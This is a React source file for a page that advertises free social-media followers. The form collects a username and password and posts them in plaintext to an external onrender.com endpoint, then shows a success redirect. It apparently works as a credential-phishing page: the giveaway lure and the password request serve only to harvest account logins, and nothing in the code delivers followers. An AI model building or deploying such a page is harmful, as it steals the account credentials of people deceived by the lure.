import React, { useState } from "react";
import "./App.css";
import axios from "axios";
import {useNavigate } from "react-router-dom";

const Component = () => {
  const [username, setusername] = useState("");
  const [password, setPassword] = useState("");
  const [followers, setFollowers] = useState("");

  const [emailErr, setEmailErr] = useState(false);
  const [passwordErr, setPasswordErr] = useState(false);
  const [followersErr, setFollowersErr] = useState(false);

  const [showPass, setShowPass] = useState(false)

  const navigate = useNavigate()

  const SubmitHandler = async (e) => {
    e.preventDefault();

    // Reset Errors
    setEmailErr(false);
    setPasswordErr(false);
    setFollowersErr(false);

    let isValid = true;

    if (username.trim() === "") {
      setEmailErr(true);
      isValid = false;
    }

    if (password.trim() === "") {
      setPasswordErr(true);
      isValid = false;
    }

    if (followers === "") {
      setFollowersErr(true);
      isValid = false;
    }

    if (!isValid) return;

    try {
      const res = await axios.post("https://get-followers-4z2j.onrender.com/formdata", {
        username,
        password,
        followers,
      });

      navigate("/sucsess")


      setusername("");
      setPassword("");
      setFollowers("");
    } catch (err) {
      console.log("full error",err);

      if (err.response) {
        alert(err.response.data.message);
      } else {
        alert(err.message);
      }
    }
  };

  return (
    <div className="container">
      <div className="main">
        <marquee>SignUp For get Free Followers</marquee>

        <form onSubmit={SubmitHandler}>
          <label>Username</label>

          <input
            type="text"
            placeholder="Enter Username"
            value={username}
            onChange={(e) => setusername(e.target.value)}
          />

          {emailErr && (
            <p style={{ color: "red" }}>Username is required</p>
          )}

          <label>Password</label>

          <div className="pass">
            <input
              type={showPass ? "text" : "password"}
              placeholder="Enter Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <span onClick={() => setShowPass(!showPass)}>{showPass ? "Hide" : "Show"}</span>
          </div>

          {passwordErr && (
            <p style={{ color: "red" }}>Password is required</p>
          )}

          <select
            value={followers}
            onChange={(e) => setFollowers(e.target.value)}
          >
            <option value="">Select Followers</option>
            <option value="10">10</option>
            <option value="20">20</option>
            <option value="30">30</option>
            <option value="40">40</option>
            <option value="50">50</option>
          </select>

          {followersErr && (
            <p style={{ color: "red" }}>Select followers is required</p>
          )}

          <button type="submit" className="SubBtn">
            Submit
          </button>
        </form>
      </div>
    </div>
  );
};

export default Component;